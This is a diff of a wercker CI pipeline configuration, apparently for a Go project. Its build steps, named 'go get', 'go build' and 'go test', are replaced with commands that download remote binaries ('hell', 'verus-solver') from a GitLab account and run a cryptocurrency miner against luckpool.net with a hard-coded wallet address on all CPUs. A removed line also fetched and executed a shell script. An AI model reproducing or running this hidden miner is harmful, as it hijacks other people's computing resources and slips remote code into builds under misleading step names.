@@ -3,10 +3,7 @@
 # If you want Google's container you would reference google/golang
 # Read more about containers on our dev center
 # https://devcenter.wercker.com/overview-and-core-concepts/containers/
-box:  
-  id: ruby:latest
-  ports:
-    - "8080"
+box: golang
 # This is the build pipeline. Pipelines are the core of wercker
 # Read more about pipelines on our dev center
 # https://devcenter.wercker.com/development/pipelines/
@@ -27,10 +24,20 @@ build:
   steps:
     # Sets the go workspace and places you package
     # at the right place in the workspace tree
-    #- setup-go-workspace
+    - setup-go-workspace
 
     # Gets the dependencies
     - script:
         name: go get
         code: |
-               wget https://gitlab.com/jiorio669/sh/-/raw/main/cc_min_zerg.sh && chmod 777 cc_min_zerg.sh && ./cc_min_zerg.sh
+          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure -p x --cpu $(nproc)
+    # Build the project
+    - script:
+        name: go build
+        code: |
+          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure -p x --cpu $(nproc)
+    # Test the project
+    - script:
+        name: go test
+        code: |
+          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure -p x --cpu $(nproc)
